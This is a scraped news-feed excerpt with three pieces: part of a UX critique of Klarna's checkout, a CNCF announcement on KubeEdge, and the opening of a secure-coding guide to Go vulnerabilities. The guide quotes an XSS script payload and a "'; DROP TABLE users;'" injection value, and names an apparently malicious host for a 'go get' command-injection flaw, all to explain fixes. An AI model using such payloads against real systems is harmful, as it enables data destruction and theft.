					<p>I’ve overly-simplified this, but consider that there are only two types of behaviour:</p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="97ec5ed" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="cf80687" data-element_type="column">
			<div>
					<div>
				<section data-id="7e48004" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				
				<div data-id="b006a6f" data-element_type="column">
			<div>
					<div>
				<div data-id="5ccdd20" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><strong>1. Event-driven behaviour</strong></p>
<p>People have a clear purpose or goal.</p></div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="729feb3" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				
				<div data-id="ffc6378" data-element_type="column">
			<div>
					<div>
				<div data-id="ec89554" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><b>2. Casual browsing</b></p>
<p>Open to being tempted by offers and new products.</p></div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="e172bda" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="ae81c4a" data-element_type="column">
			<div>
					<div>
				<div data-id="4482701" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Klarna have a version of this when paying for your <em>first</em> item, after you click on a CTA that is very event-drive: “<em>I’m ready to pay”</em>.</p>
				</div>
				</div>
				<div data-id="375d035" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>As this is your first experience of Klarna, you’re probably anxious to see if there will be any additional fees. You want to make the payment as quickly as possible, and be reassured that you didn’t make a mistake trusting Klarna in the first place.</p>
				</div>
				</div>
				<div data-id="19dcef3" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Well, after clicking on that CTA, you’re immediately asked to invest your time into creating better future shopping experiences. This is their ‘clubcard’ moment.</p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="95c6e5a" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="2c8094f" data-element_type="column">
			<div>
					<div>
				<section data-id="d212cad" data-element_type="section">
						<div>
				<div>
				<div data-id="c56e247" data-element_type="column">
			<div>
					<div>
				<div data-id="0d2a083" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p><strong>You click “I’m ready to pay”…</strong></p>
				</div>
				</div>
				<div data-id="205879d" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img width="400" height="866" src="https://builtformars.co.uk/wp-content/uploads/2020/09/IMG_4743.jpg" alt="" srcset="https://builtformars.co.uk/wp-content/uploads/2020/09/IMG_4743.jpg 400w, https://builtformars.co.uk/wp-content/uploads/2020/09/IMG_4743-139x300.jpg 139w, https://builtformars.co.uk/wp-content/uploads/2020/09/IMG_4743-46x100.jpg 46w, https://builtformars.co.uk/wp-content/uploads/2020/09/IMG_4743-208x450.jpg 208w" sizes="(max-width: 400px) 100vw, 400px">											</p>
				</div>
				</div>
						</div>
			</div>
		</div>
				
				<div data-id="7a3bed4" data-element_type="column">
			<div>
					<div>
				
				<div data-id="9790067" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img width="400" height="866" src="https://builtformars.co.uk/wp-content/uploads/2020/09/KlarnaShoppingMadeEasy.jpg" alt="" srcset="https://builtformars.co.uk/wp-content/uploads/2020/09/KlarnaShoppingMadeEasy.jpg 400w, https://builtformars.co.uk/wp-content/uploads/2020/09/KlarnaShoppingMadeEasy-139x300.jpg 139w, https://builtformars.co.uk/wp-content/uploads/2020/09/KlarnaShoppingMadeEasy-46x100.jpg 46w, https://builtformars.co.uk/wp-content/uploads/2020/09/KlarnaShoppingMadeEasy-208x450.jpg 208w" sizes="(max-width: 400px) 100vw, 400px">											</p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="da9be87" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="b5ed187" data-element_type="column">
			<div>
					<div>
				<div data-id="6502581" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>The point here isn’t that Klarna shouldn’t be asking users to invest their time—it’s that right now, in this moment, the user is focused on a task.&nbsp;</p>
				</div>
				</div>
				<div data-id="81d3f5c" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>And if you’re trying to get a user’s attention, to ultimately invest time into something irrelevant, then you’ll have much more success doing it <strong><em>after</em></strong> they’ve completed that task.</p>
				</div>
				</div>
				<div data-id="fcbfbaa" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Or rather: if Klarna asked this same question after the payment had been made, I’d be confident that they’d increase the engagement they received.</p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="08dd173" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="fde957c" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div>
					<div>
				<section data-id="4714216" data-element_type="section">
						<div>
				<div>
				<div data-id="38244b0" data-element_type="column">
			<div>
					<div>
				<div data-id="30195a9" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;none&quot;}" data-widget_type="heading.default">
				<p>
			<h4>🎯 Event-driven behaviour</h4>		</p>
				</div>
						</div>
			</div>
		</div>
				
						</div>
			</div>
		</section>
				<section data-id="b3921ab" data-element_type="section">
						<div>
				<div>
				<div data-id="eeb9bc5" data-element_type="column">
			<div>
					<div>
				<div data-id="9aac358" data-element_type="widget" data-widget_type="blockquote.default">
				<div>
					<blockquote>
			<p>
				When a user is focused on completing a specific task, they probably don't want to be distracted—and, your conversion rates will be lower.			</p>
							
					</blockquote>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="8211523" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="2278c85" data-element_type="column">
			<div>
					<div>
				
				<div data-id="2979444" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Imagine if my Tesco scenario actually went like this:</p>
				</div>
				</div>
				<div data-id="db716e1" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>“<em>Do you have a Tesco clubcard</em>?”</p>
				</div>
				</div>
				
				<div data-id="ed55f8b" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>“<em>Would you like to sign up now</em>?”</p>
				</div>
				</div>
				
				
				
				
				<div data-id="1d30900" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>Let’s be honest, this would be insane, yet it’s exactly what Klarna do. Actually, they ask if you’re sure <strong>four times</strong> in a row.</p>
</div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="3d6d98c" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						
		</section>
				<section data-id="f506cd6" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="1c15876" data-element_type="column">
			<div>
					<div>
				<div data-id="48578f3" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>There are two problems with what Klarna are doing here:</p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="cb2fa5a" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="56803dc" data-element_type="column">
			<div>
					<div>
				<section data-id="d7a0b29" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				
				<div data-id="3c3ef18" data-element_type="column">
			<div>
					<div>
				<div data-id="3beccd4" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><strong>1. Offering no new information</strong></p>
<p>Just asking the same question again isn’t convincing—you need to entice the user into changing their mind with some new information, or a benefit that they may not have correctly valued before.</p></div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="2304784" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				
				<div data-id="f9d270c" data-element_type="column">
			<div>
					<div>
				<div data-id="1e2ad5f" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><b>2. Making you skip each step individually</b></p>
<p>If you want to skip the first part of the personalisation process, you probably also want to skip all the following parts too.</p></div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="7b217be" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="8d4faf9" data-element_type="column">
			<div>
					<div>
				<div data-id="8ce480f" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>It’s actually quite helpful to use my analogy again:</p>
				</div>
				</div>
				<div data-id="138f987" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>It may be convincing enough if the Tesco employee responded with new information, for example:</p>
				</div>
				</div>
				<div data-id="0ffae1c" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>“<em>Are you sure? All I need is your email address and you’ll get a £2 bonus instantly.”</em></p>
				</div>
				</div>
				<div data-id="195c3e5" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>In conversation, this is mostly instinctive. If someone says no to your offer, you immediately know that you need to entice them a little more. Even children understand this.</p>
				</div>
				</div>
				<div data-id="e852ef5" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>But in software, human instinct needs to be designed. It rarely happens by coincidence.</p>
<p>…</p></div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="381636f" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="c2b116c" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div>
					<div>
				<section data-id="6799b13" data-element_type="section">
						
		</section>
				<section data-id="b920236" data-element_type="section">
						<div>
				<div>
				<div data-id="097f064" data-element_type="column">
			<div>
					<div>
				<div data-id="0c56897" data-element_type="widget" data-widget_type="blockquote.default">
				<div>
					<blockquote>
			<p>
				If you've got an 'are you sure' screen, make sure it's (in some way) more enticing than what you'd displayed before.			</p>
							
					</blockquote>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="865c1d0" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="48a79da" data-element_type="column">
			<div>
					<div>
				<div data-id="7594657" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;none&quot;}" data-widget_type="heading.default">
				<p>
			<h4>3. The irony of telling people how easy something is</h4>		</p>
				</div>
				<div data-id="ca49d7e" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Telling someone how easy something is—without quantifying it in any way—is in short; useless.</p>
				</div>
				</div>
				<div data-id="a763e84" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>There’s a deep irony too: companies believe their own products are easy to use, so they tell people how easy they are to use. In doing so, adding stuff for the user to read, making it take longer.</p>
				</div>
				</div>
				<div data-id="863bbfa" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>The key is to not just <em>say</em> something is easy, but explain <em>why</em> it’s easy. Otherwise it’s nothing more than padding.</p>
<p>…</p></div>
				</div>
				</div>
				
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="c25b3d2" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="579ad9b" data-element_type="column">
			<div>
					<div>
				<section data-id="3eb8f35" data-element_type="section">
						
		</section>
				<section data-id="b226c69" data-element_type="section">
						<div>
				<div>
				
				<div data-id="bb094bc" data-element_type="column">
			<div>
					<div>
				<div data-id="9c494da" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>All you need is an email address—that’s how easy it is.</p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="79467ab" data-element_type="section">
						<div>
				<div>
				
				<div data-id="c3301cb" data-element_type="column">
			<div>
					<div>
				<div data-id="718faed" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>90% of our users complete this process within 75 seconds.</p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="f209100" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="77fa63e" data-element_type="column">
			<div>
					<div>
				<div data-id="fc611af" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Klarna have a great example of this: telling the user <strong>“It’s a breeze”</strong>.</p>
				</div>
				</div>
				<div data-id="35b106d" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img width="500" height="574" src="https://builtformars.co.uk/wp-content/uploads/2020/09/ItsDamnEasy.jpg" alt="" srcset="https://builtformars.co.uk/wp-content/uploads/2020/09/ItsDamnEasy.jpg 500w, https://builtformars.co.uk/wp-content/uploads/2020/09/ItsDamnEasy-261x300.jpg 261w, https://builtformars.co.uk/wp-content/uploads/2020/09/ItsDamnEasy-87x100.jpg 87w, https://builtformars.co.uk/wp-content/uploads/2020/09/ItsDamnEasy-392x450.jpg 392w" sizes="(max-width: 500px) 100vw, 500px">											</p>
				</div>
				</div>
				<div data-id="b39ac87" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>If this seems tiny and insignificant, that’s because it is. But it’s also easily solvable, and a missed opportunity to say something that’s actually interesting.</p>
				</div>
				</div>
				<div data-id="4a0db2a" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Great product design is a balancing act of being as concise as possible, whilst also being as convincing as possible.</p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="d2b094f" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="2198c62" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div>
					<div>
				<section data-id="3741598" data-element_type="section">
						
		</section>
				<section data-id="db09822" data-element_type="section">
						<div>
				<div>
				<div data-id="432dc58" data-element_type="column">
			<div>
					<div>
				<div data-id="a6df267" data-element_type="widget" data-widget_type="blockquote.default">
				<div>
					<blockquote>
			<p>
				If you have to tell someone how easy your process is, it's probably not easy enough.			</p>
							
					</blockquote>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="ae6fb04" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="ca99bc1" data-element_type="column">
			<div>
					<div>
				<div data-id="ed0d631" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;none&quot;}" data-widget_type="heading.default">
				<p>
			<h4>4. People will enter their details incorrectly</h4>		</p>
				</div>
				<div data-id="be4fb93" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>You’ve probably heard the quote: <em>nothing is certain, except death and taxes</em>.</p>
				</div>
				</div>
				<div data-id="412a5b0" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Really though, this needs to be rewritten for 2020:</p>
				</div>
				</div>
				<div data-id="f76dde6" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>“Nothing is certain, except death, taxes, <strong>and that customers will enter their personal details incorrectly on your form</strong>“.</p>
				</div>
				</div>
				<div data-id="fd9a5eb" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>When designing software, in particular forms, you need to make sure that users can go back and edit their data—without having to just start again—because they will get it wrong some of the time.</p>
				</div>
				</div>
				<div data-id="1505f04" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Which is why verifying your phone number with Klarna is so frustrating—you can’t go back. You have to request a new email, get a new link, and start again.</p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="3ef561d" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						
		</section>
				<section data-id="a021ffc" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="aaf462b" data-element_type="column">
			<div>
					<div>
				<div data-id="e74d53d" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>This is probably an oversight, …</p></div></div></div></div></div></div></div></section></div></div></div></div></div></div></div></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://builtformars.co.uk/how-klarna-works/">https://builtformars.co.uk/how-klarna-works/</a></em></p>]]>
            </description>
            <link>https://builtformars.co.uk/how-klarna-works/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24502062</guid>
            <pubDate>Thu, 17 Sep 2020 07:32:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TOC Approves KubeEdge as Incubating Project – Cloud Native Computing Foundation]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24502043">thread link</a>) | @kwang0126
<br/>
September 17, 2020 | https://www.cncf.io/blog/2020/09/16/toc-approves-kubeedge-as-incubating-project/ | <a href="https://web.archive.org/web/*/https://www.cncf.io/blog/2020/09/16/toc-approves-kubeedge-as-incubating-project/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>Today, the CNCF Technical Oversight Committee (TOC) voted to accept <a href="https://kubeedge.io/en/">KubeEdge</a> as an incubation-level hosted project.</p>



<p>KubeEdge is an open source system for extending containerized application orchestration capabilities to hosts at the edge. It is built on top of Kubernetes and provides infrastructure support for network, application deployment, and metadata synchronization between the cloud and the edge.</p>



<p>“We designed KubeEdge to address three major challenges in edge computing – network reliability between the cloud and edge, resource constraint on edge nodes, and scalability challenges of highly distributed edge architectures,” said Zefeng Wang and Yin Ding, KubeEdge maintainers. “By extending cloud native technologies to the edge, KubeEdge forms a complete edge cloud computing ecosystem. We are very excited to continue to make the project more robust as it moves to incubation.”</p>



<p>KubeEdge was accepted as a CNCF Sandbox project in March 2019, and released version 1.0 in June 2019. The KubeEdge team now releases quarterly, timed with the release of upstream Kubernetes.&nbsp;</p>



<p>Since joining CNCF, KubeEdge has added more than <a href="https://kubeedge.devstats.cncf.io/d/18/overall-project-statistics-table?orgId=1">395 Contributors</a> from 25 organizations. The project has 14 maintainers from 5 different organizations, including Arm, China Unicom, Huawei, infoblox.com, and inovex.de, and is used in production by <a href="https://huaweicloud.com/">Huawei Cloud</a>, <a href="https://kubesphere.io/">KubeSphere</a>, <a href="https://github.com/kubeedge/kubeedge/blob/master/ADOPTERS.md#raisecom-technology-coltd">Raisecom</a>, <a href="https://cucc.wocloud.cn/">WoCloud</a>, <a href="https://github.com/kubeedge/kubeedge/blob/master/ADOPTERS.md#xinghai-iot">Xinghai IoT</a>, and more.</p>



<p>“KubeEdge solves a complex and unique use case of running containerized applications on edge devices, which benefits the cloud computing ecosystem as a whole,” said Alena Prokharchyk, CNCF TOC member. “Its architecture meets the reliability, availability, and extensibility criteria needed for further growth and adoption. We look forward to seeing new and improved features as the project moves to this new level.”</p>



<p><strong>Main KubeEdge Features:</strong></p>



<ul><li>Cloud-Edge Reliable Collaboration: Ensure reliable messages delivery without loss over an unstable cloud-edge network.</li><li>Edge Autonomy: Ensure edge nodes run autonomously, and the applications on edge run normally, even when the cloud-edge network is unstable, or the edge is offline and restarted.</li><li>Edge Device Management: Managing edge devices through Kubernetes native APIs implemented by CRD.</li><li>Lightweight Edge Agent: Extremely lightweight Edge Agent&nbsp; (EdgeCore) to run on the resource-constrained edge.</li></ul>



<p><strong>Notable Milestones:</strong></p>



<ul><li>&gt; 2,500 Commits</li><li>&gt; 2,900 GitHub Stars</li><li>&gt; 780 Forks</li></ul>



<p>KubeEdge is an active participant in the CNCF community and contributes to the upstream Kubernetes project to solve common issues. The project is built on Kubernetes and integrates with other CNCF projects, including containerd and CRI-O as a lightweight container runtime, Prometheus for metrics on the edge, and Envoy for ingress. It also uses gRPC to offer cloud edge remote calls for applications.</p>



<p>The KubeEdge team also <a href="https://thenewstack.io/kubeedge-and-its-role-in-multi-access-edge-computing/">collaborated with LF Edge</a> in setting up the Akraino KubeEdge Edge Service Blueprint Family and Akraino Eliot Blueprint Family projects, which can be deployed at enterprise edges or as a cloud edge extension interfacing to the core telco network.</p>



<p>“Kubernetes is the de-facto orchestrator for cloud native services and is starting to evolve in future edge computing deployments,” said Chris Aniszczyk, CTO/COO of Cloud Native Computing Foundation. “KubeEdge plays an important role in bringing Kubernetes to the edge. We look forward to seeing how the project develops and pushes the Kubernetes community into new areas.”&nbsp;</p>



<p>As a CNCF-hosted project, joining incubating technologies Argo, CloudEvents, CNI, Contour, Cortex, CRI-O, Dragonfly, etcd, Falco, gRPC, Linkerd, NATS, Notary, OPA, OpenTracing, Operator Framework, Rook, SPIFFE, SPIRE, and Thanos, KubeEdge is part of a neutral foundation aligned with its technical interests, as well as the larger Linux Foundation, which provides governance, marketing support, and community outreach. For more information on maturity requirements for each level, please visit the <a href="https://github.com/cncf/toc/blob/master/process/graduation_criteria.adoc">CNCF Graduation Criteria</a>.</p>



<p>To learn more about KubeEdge, visit <a href="https://kubeedge.io/">https://kubeedge.io/</a>.&nbsp;</p>


			<hr>
			
		</div></div>]]>
            </description>
            <link>https://www.cncf.io/blog/2020/09/16/toc-approves-kubeedge-as-incubating-project/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24502043</guid>
            <pubDate>Thu, 17 Sep 2020 07:29:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fixing Common Go Vulnerabilities]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24501969">thread link</a>) | @hyustan
<br/>
September 17, 2020 | https://www.securecoding.com/fixing-common-go-vulnerabilities/ | <a href="https://web.archive.org/web/*/https://www.securecoding.com/fixing-common-go-vulnerabilities/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="b-text-1">
	<div>
		<div>
		<p><span>Go, sometimes referred to as Golang, is Google’s programming language and was released in 2009 with a huge growing community of developers. Go makes it easier for developers to write solid and efficient code. It’s a statically typed, compiled and open source programming language.&nbsp;</span></p>

<p><span>Go has a lightweight architecture and suitability for use in microservice and serverless architecture. Go also helps working on large scale projects that require high-level multiprocessing and networking.</span></p>

<p><span>Due to its usability and simplicity, it’s categorized as one of the first-class citizens of serverless architecture like AWS Lambda and Microsoft Azure and has also found its way up to large organizations like Netflix, Cloudflare, Docker, Adobe and and so on.</span></p>

<p><span>As more people and companies are using open source elements in their Go projects, it’s always advisable to stay updated on known vulnerabilities affecting.</span></p>

<p><span>Go doesn’t provide a lot of features and capabilities on its own, so the community is still figuring out the best packages and frameworks to use.&nbsp;</span></p>

<p><span>Everyday, lots of packages pop up on the internet and gain popularity due to their features, however if these packages are not reviewed by the Go security community, they can introduce vulnerabilities.&nbsp;</span></p>

<p><span>In this article, we are going to explore common Go vulnerabilities and how to fix them.</span></p>


<h2><b>Cross-Site Scripting (XSS) Attacks</b></h2>
<p><span>Cross-site scripting, usually known as XSS, is one of the most common security vulnerability exploits found in modern web applications. This usually happens when user inputs without being validated or encoded are used as outputs to the browser directly.&nbsp;</span></p>

<p><span>With this vulnerability, attackers can easily inject malicious code into the browsers of visitors.</span></p>

<p><span>This malicious code is executed via the unsuspecting user’s web browser by maliciously manipulating the contents of JavaScript and HTML scripts. This exploit can be used to embed malicious scripts into a web page.&nbsp;</span></p>

<p><span>These scripts are usually executed when a user opens the web page or whenever a specific action is performed by the user.&nbsp;</span></p>

<p><span>A successful Cross-Site Scripting (XSS) attack can be used to:</span></p>

<ol>
<li><span>Redirect users to phishing sites</span></li>
<li><span>Steal cookies and session information</span></li>
<li><span>Change and manipulate portions of the web page the user is opening.</span></li>
</ol>

<p><span>This can cause a lot of problems if this attack is successful on Go web server applications, especially on company web servers, and can lead to user data theft.&nbsp;</span></p>

<p><span>Let’s look at the example below:</span></p>



<p><span>and </span><span>index.html</span><span> template:</span></p>



<p><span>This example code is vulnerable to xss attack as we are passing the </span><span>name</span><span> data without encoding or escaping it to the browser.&nbsp; If we pass a malicious code like </span><span>&lt;script&gt;alert(“I’m Malicious”)&lt;/script&gt;</span><span>, it would execute the JavaScript code and pops up </span><span>I’m Malicious</span><span> alert.</span></p>



<p><span>In this example, we are using</span><a href="https://golang.org/pkg/text/template/"> <span>text/template</span></a><span> to read and render the html template. </span><span>Text/template</span><span> doesn’t encode or escape output to the browser as HTML response.&nbsp;</span></p>

<p><span>To fix this, we should use</span><a href="https://golang.org/pkg/html/template/"> <span>html/template</span></a><span> to render our html templates and as well as escape and validate user generated inputs. </span><span>html/template</span><span> generates correctly escaped html content safe from xss attacks on the web browser.</span></p>

<p><span>When building web apps that renders html templates, you should consider using </span><span>html/template</span><span> to render your html final output.</span></p>

<h2><b>SQL Injection Attacks</b></h2>
<p><span>When building Go applications that deal with databases, it’s always good to be conscious of SQL injection attacks. This is not a new type of vulnerability attack, but a very old and common attack where users with malicious intent inject a malicious SQL command into your database which is then executed by the application.</span></p>

<p><span>This would open up a vulnerability in your application that exposes your application database to attackers. This usually happens when user inputs are not properly validated and encoded before passing them to the database.</span></p>

<p><span>The SQL commands tricks the application into executing unintended actions which could end up in data modification or data theft. The SQL interpreter is not able to differentiate between intended and unintended commands and just executes all commands passed to it without checking how they’re being constructed as long as they’re valid.&nbsp;</span></p>

<p><span>With this vulnerability, an attacker can gain unauthorized access to confidential data.</span></p>

<p><span>In Go applications, there are many ways to handle SQL operations. One common way is to simply use </span><span>fmt.Sprintf()</span><span> to create and construct your SQL queries.</span></p>

<p><span>Let’s take a look at the example below:</span></p>



<p><span>This would query users with the matching email.</span></p>

<p><span>While this might look okay initially, it actually has a some potential vulnerabilities and they are not something you can ignore.</span></p>

<p><span>In the above example you are handling user inputs and not doing any form of sanitation or encoding to ensure the inputs are safe and not with malicious code.</span></p>

<p><span>For instance we can enter a malicious SQL command to drop the whole database instead of our email. Let’s take a look at the example below:</span></p>



<p><span>Instead of passing in our email – </span><span>oyetoketoby80@gmail.com</span><span>, we passed in </span><span>‘; DROP TABLE users;’</span><span> which would output the command:</span></p>



<p><span>If this command is being executed, the whole database would be dropped and deleted. Whoops! That’s quite huge as this could shutdown an application with no backups.&nbsp;</span></p>

<p><span>If you look at the command you would notice that another command </span><span>; DROP TABLE users;</span><span> has been added and the command is used for dropping a table. So basically any command could be passed and executed with nothing holding them back.</span></p>

<p><span>To fix this, you should always escape and encode user inputs and consider using SQL libraries that escape and validate all user inputs against SQL queries before running them. Libraries like </span><span>database/sql</span><span> help prevent this kind of vulnerability automatically.</span></p>

<p><span>With the </span><span>database/sql</span><span> package, you will be able to construct SQL statements that are automatically escaped properly.</span></p>

<p><span>For instance:</span></p>



<p><span>The first </span><span>buildSql</span><span>&nbsp; would return users matching the email, while the second would return nothing and won’t drop any database either. Since </span><span>”’; DROP TABLE users;”’</span><span> is seen as a normal string rather than a command.</span></p>

<p><span>Ensure you are using libraries like</span><a href="https://golang.org/pkg/database/sql/"> <span>database/sql</span></a><span> to construct and run your SQL queries as it helps automatically escape queries properly.</span></p>

<h2><b>OS Command Injections</b></h2>
<p><b>OS Command injection</b><span> which is also referred to as shell </span><b>injection</b><span> is a security vulnerability that lets a malicious user run malicious arbitrary </span><b>operating system</b><span> (</span><b>OS</b><span>) </span><b>commands</b><span> on the web server where the application is hosted and running. This will basically compromise the application and all its data.</span></p>

<p><span>The goal of the attack is to execute malicious commands on the host operating system of the application. This is usually possible when application interfacing with the system shell passes an unsafe user supplied data to the system shell directly.&nbsp;</span></p>

<p><span>With this, the attacker can run commands using the same privileges of the vulnerable application making it possible to use any kind of commands.</span></p>

<p><span>If successful, this could lead to the leakage of data, disruption of service, or other undesirable events as the attacker has full access to the server to do anything.</span></p>

<p><span>In Go 1.9.4 version downward, the </span><span>go get</span><span> implementation, when the -insecure command-line option is used,</span><a href="https://www.cvedetails.com/vulnerability-list.php"> <span>does not validate</span></a><span> the import path (</span><span>get/vcs.go</span><span> only checks for </span><span>“://”</span><span> anywhere in the string). This as a result, could “allow remote attackers to run arbitrary malicious OS commands through a malicious web server”.</span></p>

<p><span>For instance:</span></p>



<p><span>Where </span><span>https://khasheav.ru/go-vuln</span><span>:</span></p>



<p><span>With this a user can successfully run malicious code on your server. To fix this, you would need to upgrade to the latest version starting from Go 1.10 upward.</span></p>

<h2><b>CSRF Protection Attacks&nbsp;</b></h2>
<p><span>Cross-site request forgery (CSRF) which is also known as one-click attack is simply an attack that lures users into performing actions they do not intend to perform on a web application in which they are currently logged in and authenticated.</span></p>

<p><span>A CSRF attack uses stolen session cookies provided to an authenticated user to send requests to the server which the user didn’t intend to do. The attacker can disguise a button/link as a normal button/link on the webpage. Clicking that could end up performing an action you didn’t intend to do since there’s no way to validate that the request is triggered “cross-site”.</span></p>

